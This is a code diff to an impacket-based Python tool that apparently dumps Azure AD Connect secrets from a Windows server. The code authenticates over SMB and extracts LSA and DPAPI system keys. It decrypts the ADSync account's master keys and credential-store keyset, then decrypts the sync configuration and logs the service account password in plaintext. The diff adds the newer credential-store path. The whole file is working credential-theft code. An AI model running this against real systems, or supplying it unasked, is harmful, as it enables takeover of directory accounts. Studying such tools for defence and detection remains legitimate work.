@@ -9,11 +9,13 @@ from binascii import unhexlify
 from impacket import version
 from impacket.uuid import string_to_bin, bin_to_string
 from impacket.examples import logger
-from impacket.smbconnection import SMBConnection
+from impacket.smbconnection import SMBConnection, SessionError
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
 from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, OfflineRegistry, RemoteFile
-from impacket.dpapi import MasterKeyFile, MasterKey, DPAPI_BLOB
+from impacket.dpapi import MasterKeyFile, MasterKey, DPAPI_BLOB, CredentialFile, CREDENTIAL_BLOB
 from impacket.winregistry import hexdump
+from Cryptodome.Hash import HMAC, SHA1, MD4
+from hashlib import pbkdf2_hmac
 import subprocess
 import xml.etree.ElementTree as ET
 import base64
@@ -27,10 +29,29 @@ from Crypto.Cipher import AES
 def unpad(s):
     return s[:-ord(s[len(s)-1:])]
 
+def deriveKeysFromUserkey(sid, pwdhash):
+    if len(pwdhash) == 20:
+        # SHA1
+        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
+        key2 = None
+    else:
+        # Assume MD4
+        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
+        # For Protected users
+        tmpKey = pbkdf2_hmac('sha256', pwdhash, sid.encode('utf-16le'), 10000)
+        tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
+        key2 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
+
+    return key1, key2
+
 class RemoteFileRO(RemoteFile):
     '''
     RemoteFile class that doesn't remove the file on close
     '''
+    def __init__(self, smbConnection, fileName, tree='ADMIN$'):
+        RemoteFile.__init__(self, smbConnection, fileName)
+        self._RemoteFile__tid = smbConnection.connectTree(tree)
+
     def close(self):
         if self._RemoteFile__fid is not None:
             self._RemoteFile__smbConnection.closeFile(self._RemoteFile__tid, self._RemoteFile__fid)
@@ -55,15 +76,122 @@ class ADSRemoteOperations(RemoteOperations):
         finally:
             self.__restore_adsync()
 
+    def gatherCredentialFiles(self):
+        items = self.__smbConnection.listPath('C$', r'Users\ADSync\AppData\Local\Microsoft\Credentials\\*')
+        outvaults = []
+        for item in items:
+            if item.get_longname() == '.' or item.get_longname() == '..':
+                continue
+            outvaults.append(item.get_longname())
+        return outvaults
+
+    def processCredentialFile(self, file, userkey):
+        tsid = None
+        logging.info('Querying credential file %s', file)
+        remoteFileName = RemoteFileRO(self.__smbConnection, r'Users\ADSync\AppData\Local\Microsoft\Credentials\{0}'.format(file), tree="C$")
+        try:
+            remoteFileName.open()
+            data = remoteFileName.read(8000)
+            cred = CredentialFile(data)
+            # if logging.getLogger().level == logging.DEBUG:
+                # cred.dump()
+            blob = DPAPI_BLOB(cred['Data'])
+        finally:
+            remoteFileName.close()
+        gmk = bin_to_string(blob['GuidMasterKey'])
+        if tsid is None:
+            # Search for SID
+            items = self.__smbConnection.listPath('C$', r'Users\ADSync\AppData\Roaming\Microsoft\Protect\*')
+            for item in items:
+                if item.get_longname().startswith('S-1-5-80'):
+                    tsid = item.get_longname()
+                    logging.info(r'Found SID %s for NT SERVICE\ADSync Virtual Account', tsid)
+            if tsid is None:
+                logging.error('Could not determine SID for ADSync user - cannot continue searching for masterkeys')
+                return
+        key1, key2 = deriveKeysFromUserkey(tsid, userkey)
+        remoteFileName = RemoteFileRO(self.__smbConnection, r'Users\ADSync\AppData\Roaming\Microsoft\Protect\{0}\{1}'.format(tsid, gmk), tree="C$")
+        try:
+            remoteFileName.open()
+            data = remoteFileName.read(8000)
+            mkf = MasterKeyFile(data)
+            if logging.getLogger().level == logging.DEBUG:
+                mkf.dump()
+            data = data[len(mkf):]
+            # Extract master key
+            if mkf['MasterKeyLen'] > 0:
+                mk = MasterKey(data[:mkf['MasterKeyLen']])
+                data = data[len(mk):]
+            decryptedKey = mk.decrypt(key1)
+            if not decryptedKey:
+                decryptedKey = mk.decrypt(key2)
+            if not decryptedKey:
+                logging.error('Encryption of masterkey failed using SYSTEM UserKey + SID')
+                return
+            logging.info('Decrypted ADSync user masterkey using SYSTEM UserKey + SID')
+            data = CREDENTIAL_BLOB(blob.decrypt(decryptedKey))
+            # if logging.getLogger().level == logging.DEBUG:
+            #     data.dump()
+            # print(data['Target'])
+            if 'Microsoft_AzureADConnect_KeySet' in data['Target'].decode('utf-16le'):
+                parts = data['Target'].decode('utf-16le')[:-1].split('_')
+                return {
+                    'instanceid': parts[3][1:-1].lower(),
+                    'keyset_id': parts[4],
+                    'data': data['Unknown3']
+                }
+            else:
+                logging.info('Found credential containing %s, attempting next', data['Target'])
+                return
+        except SessionError as e:
+            if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(e):
+                logging.error('Could not find masterkey for file with GUID %s', gmk)
+            else:
+                raise
+        finally:
+            remoteFileName.close()
+
+    def decryptDpapiBlobSystemkey(self, item, key, entropy):
+        cryptkey = None
+        kb = DPAPI_BLOB(item)
+        mk = bin_to_string(kb['GuidMasterKey'])
+        logging.info('Decrypting DPAPI data with masterkey %s', mk)
+        # We use the RO class here since the regular class removes the file on exit
+        # Deleting DPAPI keys doesn't seem like the best idea, so best not to do this
+        remoteFileName = RemoteFileRO(self.__smbConnection, 'SYSTEM32\\Microsoft\\Protect\\S-1-5-18\\%s' % mk)
+        try:
+            remoteFileName.open()
+            data = remoteFileName.read(2000)
+            mkf = MasterKeyFile(data)
+            if logging.getLogger().level == logging.DEBUG:
+                mkf.dump()
+            data = data[len(mkf):]
+            # Extract master key
+            if mkf['MasterKeyLen'] > 0:
+                mk = MasterKey(data[:mkf['MasterKeyLen']])
+                data = data[len(mk):]
+            decryptedKey = mk.decrypt(key)
+            try:
+                decryptedkey = kb.decrypt(decryptedKey, entropy=entropy)
+                cryptkey = decryptedkey
+                if logging.getLogger().level == logging.DEBUG:
+                    hexdump(decryptedkey)
+            except Exception as ex:
+                logging.error('Could not decrypt keyset %s: %s', item, str(ex))
+        finally:
+            remoteFileName.close()
+        return cryptkey
+
     def getMdbData(self):
         dbpath = os.path.join(os.getcwd(), r"ADSync.mdf")
         output = subprocess.Popen(["ADSyncQuery.exe", dbpath], stdout=subprocess.PIPE).communicate()[0]
-        out = { 
+        out = {
             'cryptedrecords': [],
             'xmldata': []
         }
         keydata = None
-        for line in output.split('\r\n'):
+        # infile = codecs.open('out.txt', 'r', 'utf-8')
+        for line in output.split('\n'):
             try:
                 ltype, data = line.strip().split(': ')
             except ValueError:
@@ -98,7 +226,7 @@ class ADSRemoteOperations(RemoteOperations):
         rpc.set_smb_connection(self.__smbConnection)
         self.__scmr = rpc.get_dce_rpc()
         self.__scmr.connect()
-        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)        
+        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
 
     def __checkServiceStatus(self):
         # Open SC Manager
@@ -120,7 +248,7 @@ class ADSRemoteOperations(RemoteOperations):
         else:
             raise Exception('Unknown service state 0x%x - Aborting' % ans['lpServiceStatus']['dwCurrentState'])
         # If service is running, stop it temporarily
-        if self.__stopped is False:    
+        if self.__stopped is False:
             logging.info('Stopping service %s' % self.__serviceName)
             scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
             i = 0
@@ -147,43 +275,17 @@ class ADSync(OfflineRegistry):
         self.__perSecretCallback = perSecretCallback
 
     def dump(self):
+        logging.info('In dump')
         for key in self.enumKey('Shared'):
             logging.info('Found keyset ID %s', key)
             value = self.getValue(ntpath.join('Shared',key,'default'))
             if value is not None:
                 self.__itemsFound[key] = value[1]
 
-    def process(self, smbConnection, key, entropy):
+    def process(self, remoteops, key, entropy):
         cryptkeys = []
         for index, item in self.__itemsFound.items():
-            kb = DPAPI_BLOB(item)
-            mk = bin_to_string(kb['GuidMasterKey'])
-            logging.info('Decrypting DPAPI data with masterkey %s', mk)
-            # We use the RO class here since the regular class removes the file on exit
-            # Deleting DPAPI keys doesn't seem like the best idea, so best not to do this
-            remoteFileName = RemoteFileRO(smbConnection, 'SYSTEM32\\Microsoft\\Protect\\S-1-5-18\\%s' % mk)
-            try:
-                remoteFileName.open()
-                data = remoteFileName.read(2000)
-                mkf = MasterKeyFile(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    mkf.dump()
-                data = data[len(mkf):]
-                # Extract master key
-                if mkf['MasterKeyLen'] > 0:
-                    mk = MasterKey(data[:mkf['MasterKeyLen']])
-                    data = data[len(mk):]
-                decryptedKey = mk.decrypt(key)
-                self.__itemsWithKey[index] = (item, key)
-                try:
-                    decryptedkey = kb.decrypt(decryptedKey, entropy=entropy)
-                    cryptkeys.append(decryptedkey)
-                    if logging.getLogger().level == logging.DEBUG:
-                        hexdump(decryptedkey)
-                except Exception as ex:
-                    logging.error('Could not decrypt keyset %s: %s', item, str(ex))
-            finally:
-                remoteFileName.close()
+            remoteops.decryptDpapiBlobSystemkey(item, key, entropy)
         return cryptkeys
 
 class DumpSecrets:
@@ -221,7 +323,7 @@ class DumpSecrets:
                                                self.__nthash, self.__aesKey, self.__kdcHost)
         else:
             self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-    
+
     @staticmethod
     def decrypt(record, keyblob):
         # print repr(keyblob)
@@ -290,7 +392,7 @@ class DumpSecrets:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
                         traceback.print_exc()
-                    logging.error('RemoteOperations failed: %s' % str(e))
+                    logging.error('RemoteOperations failed: %s', str(e))
                     return
 
             try:
@@ -304,37 +406,57 @@ class DumpSecrets:
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
                     traceback.print_exc()
-                logging.error('LSA hashes extraction failed: %s' % str(e))
+                logging.error('LSA hashes extraction failed: %s', str(e))
 
             if not self.dpapiSystem:
                 logging.error('DPAPI secrets not found in LSA dump')
                 return
 
-            try:
-                ADSYNCFileName = self.__remoteOps.saveADSYNC()
-                logging.info('Extracting AD Sync encryption keys from registry')
-                self.__AdSync = ADSync(ADSYNCFileName, isRemote=self.__isRemote)
-                self.__AdSync.dump()
-            except Exception, e:
-                if logging.getLogger().level == logging.DEBUG:
-                    import traceback
-                    traceback.print_exc()
-                logging.error('Ad Sync extraction failed: %s' % str(e))
+            # New format? Use it unless told not to
+            if not self.__options.legacy:
+                # New format stores in in the credential store
+                logging.info('New format keyset detected, extracting secrets from credential store')
+                files = self.__remoteOps.gatherCredentialFiles()
+                for credfile in files:
+                    result = self.__remoteOps.processCredentialFile(credfile, self.dpapiSystem['UserKey'])
+                    if result is not None:
+                        if result['keyset_id'] != mdbdata['keyset_id'] or result['instanceid'] != mdbdata['instance']:
+                            logging.warning('Found keyset %s instance %s, but need keyset %s instance %s. Trying next',
+                                result['keyset_id'], result['instanceid'], mdbdata['keyset_id'], mdbdata['instance'])
+                        else:
+                            logging.info('Found correct encrypted keyset to decrypt data')
+                            break
+                if result is None:
+                    logging.error('Failed to find correct keyset data')
+                    return
+                cryptkeys = [self.__remoteOps.decryptDpapiBlobSystemkey(result['data'], self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))]
+            else:
+                # Old format: registry stored
+                try:
+                    ADSYNCFileName = self.__remoteOps.saveADSYNC()
+                    logging.info('Extracting AD Sync encryption keys from registry')
+                    self.__AdSync = ADSync(ADSYNCFileName, isRemote=self.__isRemote)
+                    self.__AdSync.dump()
+                except Exception, e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        traceback.print_exc()
+                    logging.error('Ad Sync extraction failed: %s', str(e))
 
-            try:
-                cryptkeys = self.__AdSync.process(self.__smbConnection, self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))
-            except Exception, e:
-                if logging.getLogger().level == logging.DEBUG:
-                    import traceback
-                    traceback.print_exc()
-                logging.error('DPAPI master key extraction failed: %s' % str(e))            
+                try:
+                    cryptkeys = self.__AdSync.process(self.__remoteOps, self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))
+                except Exception, e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        traceback.print_exc()
+                    logging.error('DPAPI master key extraction failed: %s', str(e))
 
             try:
                 logging.info('Decrypting encrypted AD Sync configuration data')
                 for index, record in enumerate(mdbdata['cryptedrecords']):
                     # Try decrypting with highest cryptkey record
                     drecord = DumpSecrets.decrypt(record, cryptkeys[-1]).replace('\x00','')
-                    
+
                     with open('r%d_xml_data.xml' % index, 'w') as outfile:
                         data = base64.b64decode(mdbdata['xmldata'][index]).decode('utf-16-le')
                         outfile.write(data)
@@ -365,6 +487,7 @@ class DumpSecrets:
                     if el is not None:
                         fpw = el.text
                     if fpw:
+                        # fpw = fpw[:len(fpw)/2] + '...[REDACTED]'
                         logging.info('\tPassword: %s', fpw)
 
 
@@ -372,7 +495,7 @@ class DumpSecrets:
                 #if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
-                logging.error('Recprd decryption failed: %s' % str(e))            
+                logging.error('Recprd decryption failed: %s', str(e))
 
 
         except (Exception, KeyboardInterrupt), e:
@@ -414,6 +537,7 @@ if __name__ == '__main__':
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                        ' (if you want to parse local files)')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('--legacy', action='store_true', help='Use legacy keyset storage location (registry)')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     group = parser.add_argument_group('authentication')
@@ -447,7 +571,7 @@ if __name__ == '__main__':
 
     domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
         options.target).groups('')
-        
+
     #In case the password contains '@'
     if '@' in remoteName:
         password = password + '@' + remoteName.rpartition('@')[0]
